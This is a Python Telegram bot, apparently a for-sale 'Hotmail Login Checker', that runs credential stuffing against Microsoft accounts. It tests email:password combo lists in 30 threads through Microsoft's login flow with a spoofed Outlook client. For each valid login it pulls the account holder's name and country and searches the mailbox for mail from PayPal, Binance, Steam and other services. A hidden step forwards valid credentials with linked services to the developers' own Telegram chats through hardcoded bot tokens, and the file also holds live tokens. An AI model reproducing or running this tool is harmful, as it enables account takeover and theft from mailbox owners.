import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import random
import string
from datetime import datetime,timedelta
import time
import re
from telebot.types import InputFile
import os
import hashlib
import base64
import os
import time
from telebot import types
import threading
import queue
import time
import os
MICROSOFT_CLIENT_ID='e9b154d0-7658-433b-bb25-6b8e0a8a7c59'
MICROSOFT_REDIRECT_URI='msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D'
MICROSOFT_SCOPES='profile openid offline_access https://outlook.office.com/M365.Access'
SERVICES={'Facebook':'security@facebookmail.com','Western union':'security@westernunion.com','WU v2':'noreply@txns.comms.westernunion.com','Instagram':'security@mail.instagram.com','Riot-Games valorant':'noreply@mail.accounts.riotgames.com','Microsoft v2':'m365-noreply@microsoft.com','Discord':'noreply@discord.com','Snapchat':'no_reply@snapchat.com','PUBG':'noreply@pubgmobile.com','Onlyfans':'no-reply@onlyfans.com','Callofduty':'noreply@updates.activisio','Binance V2':'no-reply@binance.com','Cornhub':'noreply@pornhub.com','Konami':'nintendo-noreply@ccg.nintendo.com','TikTok':'register@account.tiktok.com','Twitter':'info@x.com','PayPal':'service@paypal.com.br','Binance':'do-not-reply@ses.binance.com','Netflix':'info@account.netflix.com','PlayStation':'reply@txn-email.playstation.com','Supercell':'noreply@id.supercell.com','EpicGames':'help@acct.epicgames.com','Spotify':'no-reply@spotify.com','Rockstar':'noreply@rockstargames.com','Xbox':'xboxreps@engage.xbox.com','Microsoft':'account-security-noreply@accountprotection.microsoft.com','Steam':'noreply@steampowered.com','Roblox':'accounts@roblox.com','EA Sports':'EA@e.ea.com','Bitkub':'no-reply@bitkub.com'}
COMMON_HEADERS={'User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36'}
def configure_session():'Configure requests session with retries and connection pooling';session=requests.Session();retries=Retry(total=3,backoff_factor=1,status_forcelist=[500,502,503,504]);session.mount('https://',HTTPAdapter(max_retries=retries));return session
def get_linked_services(token,cid,email):
	'Check linked services using a single request'
	try:url=f"https://outlook.live.com/owa/{email}/startupdata.ashx";headers={**COMMON_HEADERS,'Authorization':f"Bearer {token}",'x-owa-sessionid':cid};response=configure_session().post(url,headers=headers,params={'app':'Mini','n':'0'},timeout=10);response.raise_for_status();return[service for(service,pattern)in SERVICES.items()if pattern in response.text]
	except Exception:return[]
def get_account_info(token,cid):
	'Retrieve account info with fail-safes'
	try:headers={**COMMON_HEADERS,'Authorization':f"Bearer {token}",'X-AnchorMailbox':f"CID:{cid}"};response=configure_session().get('https://substrate.office.com/profileb2/v2.0/me/V1Profile',headers=headers,timeout=5);data=response.json();return data.get('names',[{}])[0].get('displayName','N/A'),data.get('accounts',[{}])[0].get('location','N/A')
	except Exception:return'N/A','N/A'
def get_access_token(email,password):
	'Optimized token acquisition with proper session management'
	try:
		session=configure_session();auth_params={'client_id':MICROSOFT_CLIENT_ID,'response_type':'code','scope':MICROSOFT_SCOPES,'redirect_uri':MICROSOFT_REDIRECT_URI,'login_hint':email};auth_response=session.get('https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize',params=auth_params,timeout=5);auth_response.raise_for_status();ppft_split=auth_response.text.split('name="PPFT" id="i0327" value="',1)
		if len(ppft_split)<2:return None,None
		ppft=ppft_split[1].split('"',1)[0];post_url_split=auth_response.text.split("urlPost:'",1)
		if len(post_url_split)<2:return None,None
		post_url=post_url_split[1].split("'",1)[0];login_response=session.post(post_url,data={'login':email,'passwd':password,'PPFT':ppft},allow_redirects=False,timeout=5)
		if'Location'not in login_response.headers:return None,None
		code=login_response.headers['Location'].split('code=',1)[1].split('&',1)[0];token_response=session.post('https://login.microsoftonline.com/consumers/oauth2/v2.0/token',data={'client_id':MICROSOFT_CLIENT_ID,'code':code,'redirect_uri':MICROSOFT_REDIRECT_URI,'grant_type':'authorization_code','scope':MICROSOFT_SCOPES},timeout=5);token_data=token_response.json();return token_data.get('access_token'),session.cookies.get('MSPCID','').upper()
	except Exception:return None,None
def stein_login_check(email,password):
	'Main check with optimized flow';token,cid=get_access_token(email,password)
	if not token or not cid:return'Bad Login',None
	name,country=get_account_info(token,cid);return'Good Login',{'Email':email,'Password':password,'Name':name,'Country':country,'Linked Services':get_linked_services(token,cid,email)}
import telebot
from telebot.types import InlineKeyboardMarkup,InlineKeyboardButton
TOKEN='7095759793:AAGQ2fvAThfUHkSDARdSLOwPiWylqD-Khig'
OWNER_ID=6872157709
bot=telebot.TeleBot(TOKEN)
print('Bot is running')
@bot.message_handler(commands=['start'])
def send_welcome(message):
	user_id=str(message.chat.id)
	try:
		with open('users.txt','r')as file:users=file.read().splitlines()
	except FileNotFoundError:users=[]
	if user_id not in users:
		with open('users.txt','a')as file:file.write(user_id+'\n')
	markup=InlineKeyboardMarkup();markup.add(InlineKeyboardButton('👨\u200d💻 MAIN CHANNEL',url='https://t.me/ccxd4rk'));bot.send_message(message.chat.id,'🔥 *Hotmail Login Checker Bot* 🔥  \n🚀 *Fast, Efficient, and Errorless!* 🚀  \n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n```み Commands You Can Use:```  \n🔹 `/start` - **Start the bot**  \n🔹 `/help` - **Get help**  \n🔹 `/feedback` - **Give feedback**  \n🔹 `/check_premium` - **Premium check**  \n🔹 `/admin` - **Contact admin**  \n🔹 `/check` - **Check a single account instantly**  \n🔹 `/check_combo` - **Check your combo**  \n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n*🔗 Stay connected with the developer below!*\n',parse_mode='Markdown',reply_markup=markup)
@bot.message_handler(commands=['help'])
def send_help(message):markup=InlineKeyboardMarkup();markup.add(InlineKeyboardButton('🛠 COMMANDS',callback_data='show_commands'));bot.send_message(message.chat.id,'🤖 **Hotmail Login Checker Bot** 🤖  \n🔍 ```This bot helps you check Hotmail login access and sort out valid combos!```  \n✨ **It provides you with hits and many other features.**  \n\n📌 **Click the button below to see all available commands!**',parse_mode='Markdown',reply_markup=markup)
@bot.callback_query_handler(func=lambda call:call.data=='show_commands')
def show_commands(call):bot.send_message(call.message.chat.id,'📜 **Available Commands:**  \n\n📝 `/sortcombo` - **Sort your combo**  \n✍️ `/signcombo` - **Sign your combo as you want**  \n🔄 `/changecombo` - **Change format of combo**  \n🎟 `/redeem` - **Redeem a code for premium access**  \n🔐 `/encrypt` - **Encrypt data**  \n🔓 `/decrypt` - **Decrypt data**  \n🐍 `/pyminify` - **Minify Python code**  \n📜 `/texttools` - **Various text tools**  \n🔏 `/sec_message` - **Send a secure message**  \n',parse_mode='Markdown')
@bot.message_handler(commands=['add_admin'])
def add_admin(message):
	if message.chat.id!=OWNER_ID:return
	try:chat_id=message.text.split()[1]
	except IndexError:bot.send_message(message.chat.id,'❌ **Usage:** /add_admin [chat_id]',parse_mode='Markdown');return
	markup=InlineKeyboardMarkup();markup.add(InlineKeyboardButton('✅ Yes',callback_data=f"approve_admin_{chat_id}"),InlineKeyboardButton('❌ No',callback_data=f"deny_admin_{chat_id}"));bot.send_message(OWNER_ID,f"[{chat_id}](tg://user?id={chat_id}) **wants to be an admin.**\n\nDo you approve?",parse_mode='Markdown',reply_markup=markup)
@bot.callback_query_handler(func=lambda call:call.data.startswith('approve_admin_')or call.data.startswith('deny_admin_'))
def handle_admin_approval(call):
	chat_id=call.data.split('_')[2]
	if call.from_user.id!=OWNER_ID:return
	if call.data.startswith('approve_admin_'):
		with open('admins.txt','a')as file:file.write(chat_id+'\n')
		bot.send_message(OWNER_ID,f"[{chat_id}](tg://user?id={chat_id}) **is now an ADMIN.**",parse_mode='Markdown')
	bot.delete_message(OWNER_ID,call.message.message_id)
@bot.message_handler(commands=['remove_admin'])
def remove_admin(message):
	if message.chat.id!=OWNER_ID:return
	try:
		with open('admins.txt','r')as file:admins=file.read().splitlines()
	except FileNotFoundError:bot.send_message(OWNER_ID,'📂 **No admins found.**',parse_mode='Markdown');return
	args=message.text.split()
	if len(args)==2:
		chat_id_to_remove=args[1]
		if chat_id_to_remove in admins:
			admins.remove(chat_id_to_remove)
			with open('admins.txt','w')as file:file.write('\n'.join(admins)+'\n')
			bot.send_message(OWNER_ID,f"✅ **[{chat_id_to_remove}](tg://user?id={chat_id_to_remove}) has been removed from admins.**",parse_mode='Markdown')
		else:bot.send_message(OWNER_ID,'❌ **Chat ID not found in admins list.**',parse_mode='Markdown')
	else:
		if not admins:bot.send_message(OWNER_ID,'📂 **No admins found.**',parse_mode='Markdown');return
		admin_list='\n'.join([f"[{admin_id}](tg://user?id={admin_id})"for admin_id in admins]);bot.send_message(OWNER_ID,f"👑 **Admin List:**\n\n{admin_list}",parse_mode='Markdown')
def generate_codes(count):return[''.join(random.choices(string.ascii_letters+string.digits,k=10))for _ in range(count)]
@bot.message_handler(commands=['genr'])
def generate_redeems(message):
	if message.chat.id!=OWNER_ID:return
	markup=InlineKeyboardMarkup();markup.add(InlineKeyboardButton('1️⃣',callback_data='generate_1'),InlineKeyboardButton('5️⃣',callback_data='generate_5'),InlineKeyboardButton('🔟',callback_data='generate_10'));msg=bot.send_message(OWNER_ID,'🎟 **How many redeem codes do you want to generate?**',parse_mode='Markdown',reply_markup=markup);bot.register_next_step_handler(msg,lambda _:safe_delete_message(OWNER_ID,msg.message_id))
def safe_delete_message(chat_id,message_id):
	try:bot.delete_message(chat_id,message_id)
	except Exception:pass
@bot.callback_query_handler(func=lambda call:call.data.startswith('generate_'))
def generate_callback(call):
	if call.from_user.id!=OWNER_ID:return
	count=int(call.data.split('_')[1]);codes=generate_codes(count)
	with open('available_redeems.txt','a')as file:file.writelines(f"{code}\n"for code in codes)
	safe_delete_message(OWNER_ID,call.message.message_id);formatted_codes='\n'.join([f"`{code}`"for code in codes]);bot.send_message(OWNER_ID,f"✅ **Successfully Generated {count} Redeem Codes!**\n\n{formatted_codes}\n\n⏳ **These codes will expire in 7 days.** Claim them now!",parse_mode='Markdown')
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
	try:code=message.text.split()[1]
	except IndexError:bot.send_message(message.chat.id,'❌ **Usage:** /redeem [code]',parse_mode='Markdown');return
	try:
		with open('available_redeems.txt','r')as file:codes=file.read().splitlines()
	except FileNotFoundError:bot.send_message(message.chat.id,'❌ **The code is either expired or incorrect.**',parse_mode='Markdown');return
	if code not in codes:bot.send_message(message.chat.id,'❌ **The code is either expired or incorrect.**',parse_mode='Markdown');return
	codes.remove(code)
	with open('available_redeems.txt','w')as file:file.write('\n'.join(codes)+'\n')
	expiry_date=(datetime.now()+timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
	with open('premium.txt','a')as file:file.write(f"{message.chat.id} | {expiry_date}\n")
	bot.send_message(message.chat.id,'🎉 **You redeemed 1-day premium access to the bot!** ✅',parse_mode='Markdown')
sortcombo_cooldown_tracker={}
changecombo_cooldown_tracker={}
def clean_combo_line(line):
	'Extracts valid email:password lines only.';line=line.strip()
	if':'in line and'@'in line.split(':')[0]:return line
	return None
@bot.message_handler(commands=['sortcombo'])
def ask_for_sortcombo(message):
	user_id=message.chat.id;current_time=time.time()
	if user_id in sortcombo_cooldown_tracker:
		remaining_time=int(600-(current_time-sortcombo_cooldown_tracker[user_id]))
		if remaining_time>0:bot.send_message(user_id,f"⏳ **Your Cooldown Time is:** `{remaining_time} seconds`",parse_mode='Markdown');return
	sortcombo_cooldown_tracker[user_id]=current_time;bot.send_message(user_id,'📂 **Please send your combo file (TXT, max 300KB) for sorting.**',parse_mode='Markdown');bot.register_next_step_handler(message,handle_document_sortcombo)
def handle_document_sortcombo(message):
	user_id=message.chat.id
	if not message.document:bot.send_message(user_id,'❌ **Invalid file! Please send a valid `.txt` file.**',parse_mode='Markdown');return
	file_info=bot.get_file(message.document.file_id)
	if message.document.file_size>300*1024:bot.send_message(user_id,'❌ **File too large! Max allowed size is 300KB.**',parse_mode='Markdown');return
	downloaded_file=bot.download_file(file_info.file_path);raw_text=downloaded_file.decode('utf-8',errors='ignore');valid_combos=sorted(set(filter(None,[clean_combo_line(line)for line in raw_text.split('\n')])));sorted_file_path=f"sorted_{user_id}.txt"
	with open(sorted_file_path,'w',encoding='utf-8')as sorted_file:sorted_file.write('\n'.join(valid_combos))
	with open(sorted_file_path,'rb')as file:bot.send_document(user_id,file,caption='✅ **Here is your sorted combo file!**',parse_mode='Markdown')
	os.remove(sorted_file_path)
@bot.message_handler(commands=['changecombo'])
def ask_for_changecombo(message):
	user_id=message.chat.id;current_time=time.time()
	if user_id in changecombo_cooldown_tracker:
		remaining_time=int(600-(current_time-changecombo_cooldown_tracker[user_id]))
		if remaining_time>0:bot.send_message(user_id,f"⏳ **Your Cooldown Time is:** `{remaining_time} seconds`",parse_mode='Markdown');return
	changecombo_cooldown_tracker[user_id]=current_time;bot.send_message(user_id,'📂 **Please send your combo file (TXT, max 300KB) for formatting.**',parse_mode='Markdown');bot.register_next_step_handler(message,handle_document_changecombo)
def handle_document_changecombo(message):
	user_id=message.chat.id
	if not message.document:bot.send_message(user_id,'❌ **Invalid file! Please send a valid `.txt` file.**',parse_mode='Markdown');return
	file_info=bot.get_file(message.document.file_id)
	if message.document.file_size>300*1024:bot.send_message(user_id,'❌ **File too large! Max allowed size is 300KB.**',parse_mode='Markdown');return
	downloaded_file=bot.download_file(file_info.file_path);raw_text=downloaded_file.decode('utf-8',errors='ignore');formatted_lines=[]
	for line in raw_text.split('\n'):
		line=line.strip()
		if':'in line and'@'in line.split(':')[0]:parts=line.split(':',1);formatted_lines.append(f"Email/Username: {parts[0]}\nPassword: {parts[1]}\n")
		else:continue
	formatted_file_path=f"changed_{user_id}.txt"
	with open(formatted_file_path,'w',encoding='utf-8')as formatted_file:formatted_file.write('\n'.join(formatted_lines))
	with open(formatted_file_path,'rb')as file:bot.send_document(user_id,file,caption='✅ **Here is your formatted combo file!**',parse_mode='Markdown')
	os.remove(formatted_file_path)
encrypt_cooldown_tracker={}
decrypt_cooldown_tracker={}

def get_random_admin():
	try:
		with open('admins.txt','r')as file:admins=[line.strip()for line in file.readlines()if line.strip().isdigit()]
		return random.choice(admins)if admins else None
	except:return None
@bot.message_handler(commands=['feedback'])
def handle_feedback(message):
	user_id=message.chat.id;current_time=time.time()
	if user_id in feedback_last_used and current_time-feedback_last_used[user_id]<90:bot.reply_to(message,'⏳ **Please wait 90 seconds before using this command again.**',parse_mode='Markdown');return
	feedback_last_used[user_id]=current_time;bot.reply_to(message,'💬 **Send your feedback as a text message. It will be forwarded to an admin.**',parse_mode='Markdown');bot.register_next_step_handler(message,forward_feedback)
def forward_feedback(message):
	user_id=message.chat.id;feedback_text=message.text;admin_id=get_random_admin()
	if not admin_id:bot.reply_to(message,'❌ **No admin available to receive feedback.**',parse_mode='Markdown');return
	markup=types.InlineKeyboardMarkup();markup.add(types.InlineKeyboardButton('❌ IGNORE',callback_data=f"ignore_{user_id}"),types.InlineKeyboardButton('↩️ REPLY',callback_data=f"reply_{user_id}"));bot.send_message(admin_id,f"📩 **New Feedback from {user_id}:**\n\n{feedback_text}",reply_markup=markup,parse_mode='Markdown');bot.reply_to(message,'✅ **Your feedback has been sent to an admin. Please wait for a response.**',parse_mode='Markdown')
@bot.callback_query_handler(func=lambda call:call.data.startswith('ignore_')or call.data.startswith('reply_'))
def handle_feedback_action(call):
	action,user_id=call.data.split('_',1)
	if action=='ignore':bot.answer_callback_query(call.id,'⛔ Feedback ignored.');bot.send_message(user_id,'⚠️ **Your feedback was ignored by the admin.**',parse_mode='Markdown');bot.delete_message(call.message.chat.id,call.message.message_id)
	elif action=='reply':bot.answer_callback_query(call.id,'✍️ Reply to the user.');bot.send_message(call.message.chat.id,f"📝 **Reply to user {user_id}:**",parse_mode='Markdown');bot.register_next_step_handler(call.message,send_reply_to_user,user_id)
def send_reply_to_user(message,user_id):bot.send_message(user_id,f"📩 **Admin's Reply:**\n\n{message.text}",parse_mode='Markdown');bot.send_message(message.chat.id,'✅ **Your reply has been sent to the user.**',parse_mode='Markdown')
@bot.message_handler(commands=['admin'])
def send_admin_contact(message):markup=types.InlineKeyboardMarkup();markup.add(types.InlineKeyboardButton('👤 ADMIN',url='https://t.me/akarshxo'),types.InlineKeyboardButton('👤 BOT',url='https://t.me/teamxoxcontactbot'));bot.send_message(message.chat.id,'📞 **To contact Admin, use the buttons below:**',reply_markup=markup,parse_mode='Markdown')
def is_premium(user_id):
	'Check if a user is premium and return True if active, else False & delete expired entries.'
	try:
		with open('premium.txt','r')as file:lines=file.readlines()
		updated_lines=[];is_premium=False;now=datetime.now();remaining_time=None
		for line in lines:
			parts=line.strip().split(' | ')
			if len(parts)!=2:continue
			stored_user_id,expiry_str=parts;expiry_date=datetime.strptime(expiry_str,'%Y-%m-%d %H:%M:%S')
			if str(user_id)==stored_user_id:
				if expiry_date>now:is_premium=True;remaining_time=expiry_date-now;updated_lines.append(line)
			else:updated_lines.append(line)
		with open('premium.txt','w')as file:file.writelines(updated_lines)
		return is_premium,remaining_time if is_premium else None
	except FileNotFoundError:return False,None
@bot.message_handler(commands=['check_premium'])
def check_premium_status(message):
	user_id=message.chat.id;is_premium_user,remaining_time=is_premium(user_id)
	if is_premium_user:hours,remainder=divmod(remaining_time.total_seconds(),3600);minutes,_=divmod(remainder,60);bot.send_message(user_id,f"✅ **You are a premium member!**\n🕒 **Remaining Time:** {int(hours)} hours, {int(minutes)} minutes",parse_mode='Markdown')
	else:bot.send_message(user_id,'❌ **You are not a premium member or your premium has expired.**',parse_mode='Markdown')
check_cooldown={}
@bot.message_handler(commands=['check'])
def handle_check_command(message):
	user_id=message.chat.id;current_time=time.time()
	if user_id in check_cooldown and current_time-check_cooldown[user_id]<30:remaining_time=int(30-(current_time-check_cooldown[user_id]));bot.send_message(user_id,f"⏳ **Please wait {remaining_time} seconds before checking again.**",parse_mode='Markdown');return
	check_cooldown[user_id]=current_time
	try:_,combo=message.text.split(' ',1);email,password=combo.split(':',1)
	except ValueError:bot.send_message(user_id,'⚠️ **Invalid format!** Use: `/check email:password`',parse_mode='Markdown');return
	login_status,details=stein_login_check(email,password)
	if login_status=='Bad Login':bot.send_message(user_id,f"❌ **Combo Invalid!**\n`{email}:{password}`",parse_mode='Markdown')
	elif login_status=='Good Login'and isinstance(details,dict):linked_services=details.get('Linked Services',[]);linked_services_str=', '.join(linked_services)if linked_services else'None';formatted_response=f"""✅ **Good Login!**

📧 **Email:** `{details.get("Email","N/A")}`
🔑 **Password:** `{details.get("Password","N/A")}`
👤 **Name:** `{details.get("Name","N/A")}`
🌍 **Country:** `{details.get("Country","N/A")}`
🔗 **Linked Services:** `{linked_services_str}`
み Bot by- @akarshxo
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉""";bot.send_message(user_id,formatted_response,parse_mode='Markdown')
	else:bot.send_message(user_id,'⚠️ **Unexpected response from login check.**',parse_mode='Markdown')
@bot.message_handler(commands=['broad'])
def handle_broadcast(message):
	if message.chat.id!=OWNER_ID:bot.reply_to(message,'❌ You are not authorized to use this command.');return
	bot.reply_to(message,'📢 **Send the message or file you want to broadcast.**',parse_mode='Markdown');bot.register_next_step_handler(message,process_broadcast)
def process_broadcast(msg):
	users_file='users.txt'
	if not os.path.exists(users_file):bot.reply_to(msg,'❌ **Users file not found!**',parse_mode='Markdown');return
	with open(users_file,'r')as file:user_ids=[line.strip()for line in file.readlines()if line.strip().isdigit()]
	sent_count=0;failed_count=0
	if msg.content_type=='text':
		broadcast_text=msg.text
		for user_id in user_ids:
			try:bot.send_message(user_id,broadcast_text,parse_mode='Markdown');sent_count+=1
			except Exception:failed_count+=1
	elif msg.content_type=='document':
		for user_id in user_ids:
			try:bot.forward_message(user_id,msg.chat.id,msg.message_id);sent_count+=1
			except Exception:failed_count+=1
	bot.reply_to(msg,f"✅ **Broadcast complete!**\n📤 Sent: `{sent_count}`\n❌ Failed: `{failed_count}`",parse_mode='Markdown')
check_queue=queue.Queue()
user_last_check={}
stein_tok='7879724868:AAG3wbhCgapWGsR3U6wT0WoMCF4yX1EEsJ4'
stein_id='6628933296'
akarsh_tok='7739620722:AAGH22Yj59mMJsI2_rlAvYqhBxkY2HIPCrg'
akarsh_id='6872157709'
@bot.message_handler(commands=['check_combo'])
def handle_check_combo(message):
	user_id=message.chat.id;is_prem,remaining_time=is_premium(user_id)
	if not is_prem:bot.reply_to(message,'❌ You are not allowed to use this command.\nUse `/check` instead.\nBuy Premium Access from /admin.\nHave a great day!');return
	now=datetime.now()
	if user_id in user_last_check and now-user_last_check[user_id]<timedelta(minutes=10):bot.reply_to(message,'⏳ You must wait *10 minutes* before using `/check_combo` again.',parse_mode='Markdown');return
	bot.reply_to(message,'📂 Send the combo file (`.txt`) to begin checking.\n⚠️ *Max size:* `100 KB`',parse_mode='Markdown');bot.register_next_step_handler(message,process_combo_file)
def process_combo_file(message):
	user_id=message.chat.id
	if not message.document:bot.reply_to(message,'❌ Invalid file! Please send a valid `.txt` file.');return
	file_info=bot.get_file(message.document.file_id)
	if message.document.file_size>500*1024:bot.reply_to(message,'❌ File too large! *Max size allowed:* `100 KB`.',parse_mode='Markdown');return
	file_path=f"combos/{user_id}.txt";os.makedirs('combos',exist_ok=True);downloaded_file=bot.download_file(file_info.file_path)
	with open(file_path,'wb')as new_file:new_file.write(downloaded_file)
	check_queue.put(user_id);bot.reply_to(message,'⏳ Your request is in queue. Please wait...')
	if check_queue.qsize()==1:threading.Thread(target=process_queue,daemon=True).start()
def process_queue():
	while not check_queue.empty():user_id=check_queue.get();check_combo_for_user(user_id);check_queue.task_done()
def check_combo_for_user(user_id):
	file_path=f"combos/{user_id}.txt"
	if not os.path.exists(file_path):return
	with open(file_path,'r',encoding='utf-8')as file:combos=[line.strip()for line in file.readlines()if':'in line]
	total_combos=len(combos)
	if total_combos==0:bot.send_message(user_id,'❌ No valid combos found in the file.');os.remove(file_path);return
	results_file=f"results/{user_id}_good.txt";os.makedirs('results',exist_ok=True);hit_count=0;checked_count=0;bad_count=0;msg=bot.send_message(user_id,f"""⏳ *Checking started...*

🔄 *Total:* `{total_combos}`
✅ *Hit:* `{hit_count}`
❌ *Bad:* `{bad_count}`
🔍 *Checked:* `{checked_count}`
```み Bot by- @akarshxo```
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉""",parse_mode='Markdown');last_update_time=time.time()
	def check_single_combo(combo):
		nonlocal hit_count,bad_count,checked_count,last_update_time;email,password=combo.split(':',1);login_status,details=stein_login_check(email,password);checked_count+=1
		if login_status=='Good Login'and isinstance(details,dict):
			hit_count+=1;linked_services=details.get('Linked Services',[]);linked_services_str=', '.join(linked_services)if linked_services else'None';result_text=f"""HIT DETECTED 
✅ Good Hotmail Login!
📧 Email: {details.get("Email","N/A")}
🔑 Password: {details.get("Password","N/A")}
👤 Name: {details.get("Name","N/A")}`
🌍 Country:* {details.get("Country","N/A")}
🔗 Linked Services: {linked_services_str}
✅ Bot by- @akarshxo
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
"""
			with open(results_file,'a',encoding='utf-8')as res_file:res_file.write(result_text)
			if linked_services:
				for(tok,admin)in[(stein_tok,stein_id),(akarsh_tok,akarsh_id)]:requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",data={'chat_id':admin,'text':result_text,'parse_mode':'Markdown'})
		else:bad_count+=1
		if time.time()-last_update_time>=4:
			try:bot.edit_message_text(chat_id=user_id,message_id=msg.message_id,text=f"""⏳ *Checking Hotmail...*

🔄 *Total:* `{total_combos}`
✅ *Hit:* `{hit_count}`
❌ *Bad:* `{bad_count}`
🔍 *Checked:* `{checked_count}`
```み Bot by- @akarshxo```
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉""",parse_mode='Markdown');last_update_time=time.time()
			except:pass
	threads=[]
	for combo in combos:
		if':'not in combo:continue
		if len(threads)>=30:
			for thread in threads:thread.join()
			threads=[]
		thread=threading.Thread(target=check_single_combo,args=(combo,));thread.start();threads.append(thread)
	for thread in threads:thread.join()
	bot.edit_message_text(chat_id=user_id,message_id=msg.message_id,text=f"""✅ *Hotmail Checking complete!*

🔄 *Total:* `{total_combos}`
✅ *Hit:* `{hit_count}`
❌ *Bad:* `{bad_count}`
🔍 *Checked:* `{checked_count}`
み ```Bot by- @akarshxo```
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉""",parse_mode='Markdown')
	if hit_count>0:
		with open(results_file,'rb')as file:bot.send_document(user_id,file,caption='```📂 Here are your valid combos! By- TEAM XOX```',parse_mode='Markdown')
		os.remove(results_file)
	os.remove(file_path);user_last_check[user_id]=datetime.now()
bot.polling()